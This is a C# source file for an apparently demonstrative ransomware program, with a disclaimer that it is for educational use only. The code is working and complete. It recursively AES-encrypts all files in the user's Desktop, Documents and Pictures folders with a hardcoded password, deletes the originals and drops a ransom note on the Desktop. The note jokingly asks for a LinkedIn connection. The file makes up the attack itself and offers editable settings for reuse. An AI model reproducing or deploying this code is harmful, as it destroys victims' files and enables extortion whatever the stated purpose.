using System;
using System.IO;
using System.Security.Cryptography;


namespace DANIELRUIZ_RansomwareProject
{
    class LinkedInProject1
    {
        static void Main(string[] args)
        {
            /* This code has been created for Educational purposes. I am not responsible for the harmful use of it. Do not use it outside of a controlled and authorized environment */


            // ----------- EDIT THESE VARIABLES FOR YOUR OWN USE CASE ----------- //

            const bool DELETE_ALL_ORIGINALS = true; /* CAUTION */
            const bool ENCRYPT_DESKTOP = true;
            const bool ENCRYPT_DOCUMENTS = true;
            const bool ENCRYPT_PICTURES = true;
            const string ENCRYPTED_FILE_EXTENSION = ".jcrypt";
            const string ENCRYPT_PASSWORD = "ruizramisdaniel";

            // ----------------------------- END -------------------------------- //

            string RANSOM_LETTER =
              "Whoops! Your files have been encrypted.\n\n" +
              "To unlock them, please Connect on LinkedIn!\n" +
              "linkedin.com/in/danielruizramis/\n\n";
            string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
            int encryptedFileCount = 0;

            EncryptionProcess();

            void EncryptionProcess()
            {


                if (ENCRYPT_DESKTOP)
                {
                    encryptFolderContents(DESKTOP_FOLDER);
                }

                if (ENCRYPT_PICTURES)
                {
                    encryptFolderContents(PICTURES_FOLDER);
                }

                if (ENCRYPT_DOCUMENTS)
                {
                    encryptFolderContents(DOCUMENTS_FOLDER);
                }

                if (encryptedFileCount > 0)
                {
                    dropRansomLetter();
                }
                else
                {
                    Console.Out.WriteLine("No files to encrypt.");
                }
            }

            void dropRansomLetter()
            {
                StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
                ransomWriter.WriteLine(RANSOM_LETTER);
                ransomWriter.Close();
            }

            void encryptFolderContents(string sDir)
            {
                try
                {
                    foreach (string f in Directory.GetFiles(sDir))
                    {
                        if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
                        {
                            Console.Out.WriteLine("Encrypting: " + f);
                            FileEncrypt(f, ENCRYPT_PASSWORD);
                        }
                    }

                    foreach (string d in Directory.GetDirectories(sDir))
                    {
                        encryptFolderContents(d);
                    }
                }
                catch (System.Exception excpt)
                {
                    Console.WriteLine(excpt.Message);
                }
            }

            //----------------------------------------------------------------------------Encryption Process----------------------------------------------------------------------------
            void FileEncrypt(string inputFile, string password)
            {
                //generate random salt
                byte[] salt = GenerateRandomSalt();

                //create output file name
                FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);

                //convert password string to byte arrray
                byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

                //Set Rijndael symmetric encryption algorithm
                RijndaelManaged AES = new RijndaelManaged();
                AES.KeySize = 256;
                AES.BlockSize = 128;
                AES.Padding = PaddingMode.PKCS7;

                //Rfc2898DeriveBytes is an implementation of PBKDF2. What it does is repeatedly hash the user password along with the salt.
                var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                //With CBC, each block of plaintext is xor'ed with the previous block of ciphertext before being transformed, ensuring that identical plaintext blocks don't result in identical ciphertext blocks when in sequence.
                //For the first block of plaintext (which doesn't have a preceding block) we use an initialisation vector instead. This value should be unique per message per key, to ensure that identical messages don't result in identical ciphertexts. 
                AES.Mode = CipherMode.CBC;

                // write salt to the begining of the output file, so in this case can be random every time
                fsCrypt.Write(salt, 0, salt.Length);

                //CryptoStream is designed to perform transformation from a stream to another stream only and allows transformations chaining
                //CryptoStream constructor arguments: (destination stream, transformation, CryptoStreamMode)
                CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);            //My "encryptator", any data sent here will be encrypted and saved in the fsCrypt file

                //Open the Original File Data
                FileStream fsIn = new FileStream(inputFile, FileMode.Open);

                //create a buffer (1mb) so only this amount will allocate in the memory and not the whole file
                byte[] buffer = new byte[1048576];
                int read;

                try
                {
                    //https://www.codeproject.com/Articles/6465/Using-CryptoStream-in-C
                    while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0) //Parameter 2 specifies the address of a buffer and parameter 3 specifies the buffer length
                    {
                        //On input for a WRITE function, the buffer address points to a buffer that contains the record to be written. The buffer length parameter specifies the length of the data to be written from the buffer.
                        cs.Write(buffer, 0, read);       //All the data in the buffer is written to my "encryptator", storing the new encrypted data in the fsCrypt file
                    }

                    // Close up
                    fsIn.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error: " + ex.Message);
                }
                finally
                {
                    encryptedFileCount++;
                    cs.Close();
                    fsCrypt.Close();
                    if (DELETE_ALL_ORIGINALS)
                    {
                        File.Delete(inputFile);
                    }
                }
            }


            static byte[] GenerateRandomSalt()
            {
                byte[] data = new byte[32];

                using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                {
                    for (int i = 0; i < 10; i++)
                    {
                        // Fille the buffer with the generated data
                        rng.GetBytes(data);
                    }
                }

                return data;
            }


        }

    }
}
